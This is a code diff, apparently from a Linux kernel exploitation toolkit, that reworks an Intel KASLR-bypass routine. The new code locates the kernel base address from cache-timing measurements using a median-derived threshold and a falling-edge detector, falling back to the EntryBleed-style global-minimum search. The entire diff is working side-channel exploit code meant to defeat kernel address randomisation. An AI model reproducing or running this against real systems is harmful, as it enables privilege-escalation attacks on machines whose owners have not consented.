@@ -41,8 +41,43 @@ static void collect_timings(uint64_t *times) {
     times[idx] /= MEASURE_ITERATIONS;
 }
 
-// Intel: mapped page = LOWER latency → global minimum wins
+// Intel: mapped page = LOWER latency. On newer CPUs (Arrow Lake+) the delta
+// is small (~5 cycles) so a global-minimum search picks up entry trampoline
+// spikes instead of kbase. Use a falling-edge detector: find the first
+// sustained drop below a threshold derived from the median of all slots.
 static size_t find_base_intel(const uint64_t *times) {
+  uint64_t sorted[NUM_SLOTS];
+  memcpy(sorted, times, sizeof(sorted));
+  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
+
+  uint64_t median = sorted[NUM_SLOTS / 2];
+  // Threshold: anything below 95% of median is "low" (mapped)
+  uint64_t threshold = median - median / 20;
+
+  log_debug("[kpwn:kaslr] intel median=%lu threshold=%lu", median, threshold);
+
+  // Skip any initial low-latency region
+  size_t start = 0;
+  while (start < NUM_SLOTS && times[start] <= threshold)
+    start++;
+
+  // Find the high→low falling edge (unmapped → mapped transition)
+  for (size_t idx = start; idx < NUM_SLOTS; idx++) {
+    if (times[idx] > threshold)
+      continue;
+    // idx is low-latency; confirm sustained run
+    if (idx + AMD_CONFIRM_M > NUM_SLOTS)
+      break;
+    int count = 0;
+    for (size_t j = 0; j < AMD_CONFIRM_M; j++) {
+      if (times[idx + j] <= threshold)
+        count++;
+    }
+    if (count >= AMD_CONFIRM_K)
+      return KERNEL_TEXT_MIN + idx * KASLR_ALIGN;
+  }
+
+  // Fallback: global minimum (classic EntryBleed behavior)
   uint64_t min_time = UINT64_MAX;
   size_t best = 0;
   for (size_t i = 0; i < NUM_SLOTS; i++) {
@@ -51,6 +86,8 @@ static size_t find_base_intel(const uint64_t *times) {
       best = i;
     }
   }
+  log_debug("[kpwn:kaslr] intel edge detection failed, fallback min slot=%zu",
+            best);
   return KERNEL_TEXT_MIN + best * KASLR_ALIGN;
 }
 
